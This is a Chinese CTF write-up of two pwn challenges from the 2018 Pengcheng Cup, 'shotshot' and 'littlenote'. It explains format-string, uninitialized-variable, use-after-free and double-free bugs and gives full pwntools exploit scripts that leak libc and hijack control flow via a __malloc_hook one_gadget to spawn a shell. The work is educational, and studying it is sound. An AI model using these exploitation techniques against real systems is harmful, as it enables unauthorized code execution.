# 鹏城杯线下部分pwn题详解

阅读量 **286286**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-12-14 10:30:53

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01884314c74b24dec7.png)

## 前言

这次鹏城杯线下槽点很多，但是主要原因还是自己TCL。。这里我就选了比较简单的两题详细讲一下解题思路，如讲得不对，欢迎大佬指正。

## shotshot

这题的泄露地址很容易，有个格式化字符串漏洞和变量未初始化，这两个都可以用来泄露地址，难点是后面有个任意地址写的漏洞怎么利用，自己先调试了好久，后来别的师傅写出脚本后我看了一眼才恍然大悟，太强了，mark。

###  1、查看保护

主要开了canary和nx。

![](https://p0.ssl.qhimg.com/t011afe453649560c1c.png)

###  2、泄露地址

程序welcome函数中的变量v1没有初始化，show函数有个明显的格式化字符串漏洞，都可以用于泄露地址。

![](https://p3.ssl.qhimg.com/t018cd2304da9cae073.png)

![](https://p4.ssl.qhimg.com/t015b56e51638eefbcd.png)

####  （1）利用变量未初始化泄露

在这里下个断点，输入几个‘a’，看看printf函数的栈里有什么。

![](https://p3.ssl.qhimg.com/t012c0c61f04ef56a36.png)

有这里可以看出，只要我们输入8个a，就能把后面的地址泄露出来，即<_IO_stdfile_2_lock>

![](https://p5.ssl.qhimg.com/t015f52197098abd290.png)

####  （2）利用格式化字符串泄露地址

这里我通过暴力泄露__libc_start_main的地址来获得基地址，偏移为11。

![](https://p0.ssl.qhimg.com/t01474ba12cd22a79ad.png)

代码为

    
    
    p.recvuntil('Your name :')
    p.sendline('aaa')
    add(0x20,'%11$lx')
    show()
    libc_start_main=int(p.recv(12),16)-0xf0
    
    #gdb.attach(p)
    print hex(libc_start_main)
    libcbase=libc_start_main-0x0020740
    print hex(libcbase)
    

![](https://p1.ssl.qhimg.com/t018279f50c953a9d2f.png)

###  3、低字节任意改

我们来看一下这里会执行start+32的地址，只要我们改掉这里的地址就能执行到我们想要的地方。

![](https://p2.ssl.qhimg.com/t018c3ebb37d9957b87.png)

在0x00040096C和0x00400C07下断点调试可以知道a1和start是同一个地址，即0x7ffff7ff5000，当v3等于0的时候就会有一次低字节任意写的机会，改写的位置就是我们输入的id，改写的内容就是我们输入的luckynum。

![](https://p0.ssl.qhimg.com/t017a4c8b3f3d9d3860.png)

![](https://p2.ssl.qhimg.com/t01aa6570a1639896ff.png)

这时只要我们id输入为32，就能改写start+32的位置，输入luckynum为0xaf就能执行0x0400AAF ，即read。代码为

    
    
    def shot(num,id):
        p.recvuntil('5. exitn')
        p.sendline('4')
        p.recvuntil('3. C++n')
        p.sendline(str(num))
        p.recvuntil('Input the id:')
        p.sendline(str(id))    
    
    def shoter():
        p.recvuntil('5. exitn')
        p.sendline('4')
        p.recvuntil('3. C++n')
        p.sendline('4')
    
    shot(1,32)
    for i in range(3):
        shoter()
    p.recvuntil('Give me your luckynum:n')
    
    p.sendline('175')
    

这时在0x00400A58下断点，就可以知道返回地址的偏移。由下图可以看出，偏移为0x10

![](https://p1.ssl.qhimg.com/t010422a644a045378c.png)

这时我们输入0x18个a就能崩溃

![](https://p1.ssl.qhimg.com/t01c53143e88709872b.png)

###  完整exp

    
    
    from pwn import*
    context.log_level=True
    p=process('./shotshot')
    
    elf=ELF('shotshot')
    libc=ELF('libc.so.6')
    
    
    def add(leng,x):
        p.recvuntil('5. exitn')
        p.sendline('1')
        p.recvuntil("weapon's name:n")
        p.sendline(str(leng))
        p.recvuntil('Input the name:n')
        p.sendline(x)
        p.recvuntil('Success!n')
    def delete():
        p.recvuntil('5. exitn')
        p.sendline('3')
        p.recvuntil("I can't believe it!")
    
    def show():
        p.recvuntil('5. exitn')
        p.sendline('2')
    def shot(num,id):
        p.recvuntil('5. exitn')
        p.sendline('4')
        p.recvuntil('3. C++n')
        p.sendline(str(num))
        p.recvuntil('Input the id:')
        p.sendline(str(id))    
    
    def shoter():
        p.recvuntil('5. exitn')
        p.sendline('4')
        p.recvuntil('3. C++n')
        p.sendline('4')
    
    
    p.recvuntil('Your name :')
    p.sendline('aaa')
    add(0x20,'%11$lx')
    show()
    libc_start_main=int(p.recv(12),16)-0xf0
    
    #gdb.attach(p)
    print hex(libc_start_main)
    libcbase=libc_start_main-0x0020740
    print hex(libcbase)
    one=libcbase+0xf02a4
    shot(1,32)
    for i in range(3):
        shoter()
    p.recvuntil('Give me your luckynum:n')
    
    p.sendline('175')
    sleep(0.5)
    p.sendline('a'*16+p64(one))
    p.interactive()
    

## littlenote

这道题目不知怎么回事，比赛刚开始没多久就有人做出来了？其实这题关键的点就是要泄露地址，然后就是简单的改malloc
hook了，我赛后跟别人交流了一下，没想到这道题有三种泄露的方法。其中一种是我万万没想到的。。

###  1、查看保护

这里主要开启了canary和NX保护

![](https://p0.ssl.qhimg.com/t018372368c137914a5.png)

###  2、ida打开分析

这里的addnote限制了大小，只有0x60和0x20，而且，这里还有一个UAF

![](https://p2.ssl.qhimg.com/t014f541c933c6a5164.png)

freenote里还有一个UAF，以及double free漏洞

![](https://p4.ssl.qhimg.com/t01860a2ba3f4ac0677.png)

hacker函数里有个负数组越界，不过貌似没什么用额。。

![](https://p4.ssl.qhimg.com/t0131d8a8c72f967551.png)

###  3、泄露地址

####  （1）、利用scanf函数泄露地址

当时听到还能这样泄露真的崩溃了，竟然还能这么简单。。只要在这里输入一个‘a’，就会输出v4的地址。

![](https://p1.ssl.qhimg.com/t01788f5cbac80b7fff.png)

![](https://p2.ssl.qhimg.com/t016510f43ef9228f0c.png)

####  （2）、利用double free覆盖got表泄露地址

这里利用fastbin
attack到got表的位置，然后就会输出上面的地址，不过这种方法利用的条件要很挑剔，在上面只找到了一个合适的位置attack。然后执行show就会输出
_IO_2_1_stderr_ 的地址

![](https://p5.ssl.qhimg.com/t017cbd64eb5afab17e.png)

代码如下

    
    
    add('a','Y')
    add('a','Y')
    delete(0)
    delete(1)
    delete(0)
    
    add(p64(elf.got['stdout']-3),'Y')
    print hex(elf.got['stdout'])
    add('a','Y')
    add('a','Y')
    
    add('a'*18,'Y')
    show(5)
    

####  （3）、利用double free修改chunk的size泄露

因为这里UAF只能泄露堆的地址，所以这里我们可以利用double
free修改fd为堆块的地址然后覆盖chunk改下一个chunk的size。free后会放入unsorted
bin，最后利用show输出泄露main_arena的地址。师傅的代码如下：

    
    
    add("1"*8)
    add("2"*0x10 + p64(0)+p64(0x71))
    add("3"*0x10 + p64(0)+p64(0x21))
    add((p64(0) + p64(0x21))*4)
    free(1)
    free(0)
    free(1)
    heap = show(0)
    print hex(heap)
    add(p64(heap+0x20)[0:2])
    add("2"*8)
    add("3"*8)
    add("4"*0x40 + p64(0) + p64(0x91))
    free(2)
    add("x88")
    addr = show(8)
    

###  4、改malloc hook为one_gadget

既然地址知道了，我们就可以利用double free改fd指针为malloc hook附近的地方，使之成为合法的chunk

    
    
    delete(2)
    delete(3)
    delete(2)
    one=libcbase+0xf02a4
    add(p64(malloc-0x13),'Y')
    add('a','Y')
    add('a','Y')
    #gdb.attach(p)
    add('a'*3+p64(one),'Y')
    delete(7)
    delete(7)
    

![](https://p5.ssl.qhimg.com/t01b62aaeb6b2b98ab6.png)

###  完整exp

    
    
    from pwn import*
    context.log_level=True
    p=process('./littlenote')
    #p=remote('172.91.0.64',8088)
    elf=ELF('littlenote')
    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    
    def add(x,f):
        p.recvuntil('Your choice:n')
        p.sendline('1')
        p.recvuntil("Enter your noten")
        p.sendline(x)
        p.recvuntil('Want to keep your note?n')
        p.sendline(str(f))
        p.recvuntil('Donen')
    def delete(id):
        p.recvuntil('Your choice:n')
        p.sendline('3')
        p.recvuntil("Which note do you want to delete?")
        p.sendline(str(id))    
    def show(id):
        p.recvuntil('Your choice:n')
        p.sendline('2')
        p.recvuntil('Which note do you want to show?n')
        p.sendline(str(id))
    def hack():
    
        p.recvuntil('Your choice:n')
        p.sendline('5')
        p.recvuntil("Enter administrator's name:n")
        p.sendline('a')
    def hacker(x):
        for i in range(-15,-9):
            p.recvuntil('Enter hacker index:n')
            p.sendline(str(i))
            p.recvuntil('Enter hacker age:n')
            p.sendline(x)
    add('a','Y')
    add('a','Y')
    delete(0)
    delete(1)
    delete(0)
    
    add(p64(elf.got['stdout']-3),'Y')
    print hex(elf.got['stdout'])
    add('a','Y')
    add('a','Y')
    
    add('a'*18,'Y')
    show(5)
    #gdb.attach(p)
    #p.recv()
    p.recvuntil('aaaaaaaaaaaaaaaaaan')
    raw_input()
    a=u64(p.recv(6).ljust(0x8,'x00'))
    libcbase=a-libc.symbols['_IO_2_1_stderr_']
    print hex(a)
    print hex(libcbase)
    malloc=libcbase+libc.symbols['__malloc_hook']
    delete(2)
    delete(3)
    delete(2)
    one=libcbase+0xf02a4
    add(p64(malloc-0x13),'Y')
    add('a','Y')
    add('a','Y')
    #gdb.attach(p)
    add('a'*3+p64(one),'Y')
    gdb.attach(p)
    delete(7)
    delete(7)
    
    
    p.recv()
    p.interactive()
    

## 小结

通过这次比赛，又学到了不少东西，让我清楚得认识到自己TCL，师傅们太强了，笑看神仙打架，今后还需要继续努力。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **GD** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/167868](/post/id/167868)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)

 **+1** __4赞

 __收藏

![](https://p3.ssl.qhimg.com/t019b15491597d7b1a6.png) GD

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

